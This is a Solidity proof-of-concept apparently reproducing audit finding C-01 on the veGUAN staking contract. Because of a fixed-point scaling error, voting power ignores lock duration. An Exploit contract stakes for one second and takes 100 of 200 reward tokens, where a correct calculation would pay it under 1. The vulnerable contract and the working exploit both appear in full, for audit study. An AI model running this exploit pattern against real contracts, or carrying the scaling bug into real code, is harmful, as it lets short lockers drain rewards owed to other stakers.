// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Guanciale veGUAN — C-01 (Shieldify, report published 2025-02)
    _calculateVotingPower expects UD60x18 inputs (value * 1e18). getVotingPowerOf
    passes raw seconds and raw stake. a * duration / 1e18 underflows to 0, so
    voting power equals stake for a 1 second lock and a 28 day lock. The reward
    pot is split on that power. The short lock takes 100 of 200 reward tokens.
    Scaled inputs pay the short lock under 1 token.
*/

contract StakeToken {
    string public symbol = "LP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardToken {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VeGuan {
    uint256 internal constant UNIT = 1e18;
    uint256 public constant MAX_LOCK = 28 days;
    uint256 public votingPowerCurveAFactor = 1;

    struct LockedPosition {
        uint256 stake;
        uint256 lockedUntil;
        address owner;
        bool claimed;
    }

    StakeToken public stakeToken;
    RewardToken public rewardToken;
    uint256 public rewardPot = 200 ether;
    mapping(uint256 => LockedPosition) public positions;

    constructor(StakeToken _stake, RewardToken _reward) {
        stakeToken = _stake;
        rewardToken = _reward;
    }

    function stake(uint256 tokenId, address owner, uint256 amount, uint256 duration) external {
        stakeToken.transferFrom(msg.sender, address(this), amount);
        positions[tokenId] = LockedPosition(amount, block.timestamp + duration, owner, false);
    }

    /// _calculateVotingPower from veGUAN.sol. Inputs are treated as UD60x18.
    function _calculateVotingPower(uint256 votingPowerCurveAFactorX18, uint256 remainingLockDurationX18, uint256 positionStakeX18)
        internal
        pure
        returns (uint256 scalingFactor, uint256 votingPower)
    {
        uint256 product = votingPowerCurveAFactorX18 * remainingLockDurationX18 / UNIT;
        uint256 scalingFactorX18 = product + UNIT;
        scalingFactor = scalingFactorX18;
        votingPower = positionStakeX18 * scalingFactorX18 / UNIT;
    }

    function _remaining(uint256 tokenId) internal view returns (uint256 remaining) {
        LockedPosition memory locked = positions[tokenId];
        if (locked.lockedUntil > block.timestamp) remaining = locked.lockedUntil - block.timestamp;
    }

    /// getVotingPowerOf from veGUAN.sol.
    function getVotingPowerOf(uint256 tokenId) public view returns (uint256 scalingFactor, uint256 votingPower) {
        LockedPosition memory locked = positions[tokenId];
        uint256 remaining = _remaining(tokenId);
        // @> VULN: raw seconds and stake are passed into UD60x18 math, so the lock multiplier underflows to zero
        return _calculateVotingPower(votingPowerCurveAFactor, remaining, locked.stake);
    }

    function getVotingPowerScaled(uint256 tokenId) public view returns (uint256 scalingFactor, uint256 votingPower) {
        LockedPosition memory locked = positions[tokenId];
        uint256 remaining = _remaining(tokenId);
        return _calculateVotingPower(votingPowerCurveAFactor * UNIT, remaining * UNIT, locked.stake);
    }

    function claim(uint256 tokenId) external returns (uint256 paid) {
        LockedPosition memory locked = positions[tokenId];
        require(locked.owner == msg.sender, "owner");
        require(!locked.claimed, "claimed");
        (, uint256 vp) = getVotingPowerOf(tokenId);
        (, uint256 longVp) = getVotingPowerOf(1);
        (, uint256 shortVp) = getVotingPowerOf(2);
        paid = rewardPot * vp / (longVp + shortVp);
        positions[tokenId].claimed = true;
        rewardToken.transfer(msg.sender, paid);
    }
}

contract Exploit {
    StakeToken public stakeToken;
    RewardToken public rewardToken;
    VeGuan public ve;
    address public longLocker = address(0x10C);
    uint256 public longPower;
    uint256 public shortPower;
    uint256 public scaledShort;
    uint256 public scaledLong;
    uint256 public paid;
    uint256 public fairShort;

    constructor() {
        stakeToken = new StakeToken();
        rewardToken = new RewardToken();
        ve = new VeGuan(stakeToken, rewardToken);
        stakeToken.mint(address(this), 200 ether);
        rewardToken.mint(address(ve), 200 ether);
    }

    function run() external {
        stakeToken.approve(address(ve), 200 ether);
        ve.stake(1, longLocker, 100 ether, ve.MAX_LOCK());
        ve.stake(2, address(this), 100 ether, 1);
        (, longPower) = ve.getVotingPowerOf(1);
        (, shortPower) = ve.getVotingPowerOf(2);
        (, scaledLong) = ve.getVotingPowerScaled(1);
        (, scaledShort) = ve.getVotingPowerScaled(2);
        fairShort = 200 ether * scaledShort / (scaledLong + scaledShort);
        paid = ve.claim(2);
        require(longPower == 100 ether, "long");
        require(shortPower == 100 ether, "short");
        require(paid == 100 ether, "paid");
        require(fairShort < 1 ether, "fair");
        require(rewardToken.balanceOf(address(this)) == 100 ether, "balance");
    }
}
